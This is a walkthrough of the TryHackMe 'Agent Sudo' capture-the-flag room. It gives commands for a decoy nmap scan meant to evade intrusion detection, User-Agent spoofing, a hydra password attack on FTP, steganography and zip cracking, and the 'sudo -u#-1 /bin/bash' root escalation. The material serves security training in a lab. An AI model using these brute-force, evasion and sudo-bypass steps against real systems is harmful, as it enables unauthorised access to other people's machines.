![intro](https://github.com/user-attachments/assets/f0320ee6-9e24-44cf-bf4d-98c32338a829)

# tryhackme-Agent-Sudo
This is a walkthrough for the tryhackme CTF Agent Sudo. I will not provide any flags or passwords as this is intended to be used as a guide.

## Scanning

First off, let's store the target IP as a variable for easy access.

Command: export ip=xx.xx.xx.xx

Next, let's run an nmap scan on the target IP:
```bash
nmap -A -v $ip -D RND:10 -oN nmap.txt
```

Command break down:

-A: This flag enables aggressive scanning. It combines various scan types (like OS detection, version detection, script scanning, and traceroute) into a single scan.

-v: increases verbosity, providing more detailed output during the scan.

—$ip: provides the target IP we stored as the variable $ip.

-D RND:10 Nmap can send additional packets to confuse network intrusion detection systems (IDS) or hide the true source of the scan by randomly selecting up to 10 decoy IP addresses.

-oN nmap.txt: This option specifies normal output that should be saved to a file named “nmap.txt.

This scan reveals three open ports:

![nmap](https://github.com/user-attachments/assets/eccc0012-bd2f-408e-99c1-5a3f32620794)

First, let's investigate the websever on port 80.
We are greeted with a message from Agent R:

![agent R](https://github.com/user-attachments/assets/6277fcae-9082-4506-a524-d4d8036d2b0c)

The User-Agent is a crucial part of the HTTP headers sent with every request. It helps servers identify the application, operating system, vendor, and version of the requesting user agent. In this case we can assume that agent R is one of the code names. Let's try spoofing as user-agent R on this url. 
```bash
curl -A "R" -L $ip
```
Command explanation:
-A let's use specify the user agent "R"
-L will follow redirects

We get a different response:

![agent R response](https://github.com/user-attachments/assets/a9312aa2-68ff-464e-a19b-d852219dc0e5)

This reponse gives us the hint that since there are 25 user-agents, and 26 letters in the alphabet, and agent R is one of them, that the user agent is most likely one of the other letters. Let's try the same command replacing "R" with "A", "B" and so on.

I wrote a bash script to use the cmd curl -A 'x' $ip -L that will loop through capital letters A to Z, get an MD5 hash of the curl response, then checks if the current response is different from the previous one, if the response is different it prints the User-Agent, response hash, and full curl output. If the response is the same as the previous one, it skips to the next letter without ouput.

![user-agent sh](https://github.com/user-attachments/assets/d0b94486-efcc-4996-920b-def30dc28daa)

```
bash
#!/bin/bash

# Function to get MD5 hash of cu response
get_response_hash() {
        curl -s -A "$1" $ip -L | md5sum | awk '{print $1}'
}

# Loop through capital letters A to Z
for letter in {A..Z}; do
        current_response=$(get_response_hash "$letter")

        if [ "$first_run" = true ] || [ "$current_response" != "$previous_response" ]; then
                echo "User-Agent: $letter"
                echo "Response hash: $current_response"
                curl -A "$letter" $ip -L
                echo -e "\n----------\n"


                previous_response=$current_response
                first_run=false
        fi
done
```

![user-agent-response](https://github.com/user-attachments/assets/be8d6a1b-3929-4857-9a54-b4efef2b9955)


This script returns a few results, one of which shows use that the correct user-agent is C. It also alerts us to the fact that agent C has a weak password, so we should attempt a dictionary attack with hydra and the wordlist rockyou.txt. Looking back our nmap scan, the password will most likely be for ftp or ssh. I attempted anonymous login to ftp: ftp $ip, but it prompted for a password, so let's try the password attack on the ftp server:
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt $ip ftp
```
After about a minute, I hydra revealed the ftp password. Let's go ahead and log into the ftp server as chris:

![ftp](https://github.com/user-attachments/assets/680a6191-3213-4c78-8a7a-516c51a7aa33)

We're in! Let's use the get command to get this image files onto our machine:
```bash
get <file name>
```
First, let's cat To_agentJ.txt:


![To_agentJ txt](https://github.com/user-attachments/assets/ae98bb71-b5fa-4334-8ece-d8915c72bcaf)
Ok, I tried exiftool and strings on cute-alien.jpg but didn't yield anything. Then I tried steghide, but it prompts for a password, so let's attack it with stegcracker:

![stegcracker](https://github.com/user-attachments/assets/e9a29a66-dd5d-450b-8d44-23411b21025f)

While stegcracker is running, let's investigate cutie.png.
First, I tried exiftool and strings on it, and strings revealed an embedded txt file:
```bash
strings cutie.png
```
![strings cutie](https://github.com/user-attachments/assets/aacac05e-b801-4149-b036-6e2a295ea515)

Now, let's try binwalk on it:

![binwalk](https://github.com/user-attachments/assets/49a337c8-972f-4ebf-94c8-e629a1379699)

binwalk extracted a new directory _cutie.png.extracted.
In this directory we see the encryped 8702.zip file. Another thing to take note of, is that To_agentJ.txt is currently empty, because it's contents haven't been extracted. We will need to crack the zip file by first using zip2john, then john to crack the resulting hash:


![zip2john](https://github.com/user-attachments/assets/81d435d3-1d32-4a9e-99c7-5ecdb27341cc)
Now that we have the password, we'll use the tool 7z to extract the contents:
```bash
7z e 8702.zip
```

Now, let's read To_agentJ.txt. It reveals a message from Agent R. This string appears to be base64 encoded, so we'll need to decode it:

![base64 -d](https://github.com/user-attachments/assets/31c31d75-89da-40f2-95c7-8f2aca19ed5b)

Now, let's check back on the jpg file that's now been cracked using stegcracker:

![stegcracker_result](https://github.com/user-attachments/assets/88edafc7-9d8b-4974-83a5-e62ea715a570)
It reveals a message from chris and contains the username and password.
Great! Let's try to ssh onto the target with these credentials:
```bash
ssh james@$ip
```

We are now logged in via ssh as james, and the user flag is in his home directory.

There is also the question about the photo- Alien_autospy.jpg.
Let's tranfer this from the target machine to our attack box. Run this command from the target machine, from the jame's home directory:
```bash
python3 -m http.server
```
And wget from the attack box to get it, replace $ip with actual target IP:
```bash
wget http://$ip:8000/Alien_autospy.jpg
```
Now that we have the jpg, go to https://images.google.com/, and upload the jpg. 
Search the results and, as per the hint, keep an eye out for the foxnews site to get the answer.

# Privilege Escalation
After running sudo -l to check jame's privileges, we see james can run:
(ALL, !root) /bin/bash
This means james cannot run /bin/bash as root, but ALL implies that he can run /bin/bash as any user. In a case like this, it's a good idea to google it, especially when the question is asking for the cve #.
I clicked the result that contains sudo 1.8.27 - Security Bypass. I pasted in this cve and it is correct!
I then ran sudo -V to check the sudo version:


![sudo -V](https://github.com/user-attachments/assets/8593f750-0ada-4c3b-9641-d1185ad204bd)

This sudo version is in the vulnerable range and fits the description like a glove!
I ran the exploit:
```bash
sudo -u#-1 /bin/bash
```
James has now escalted to root!
Now, just cat root.txt to answer the last two questions.
I hope you enjoyed this room and learned a lot!



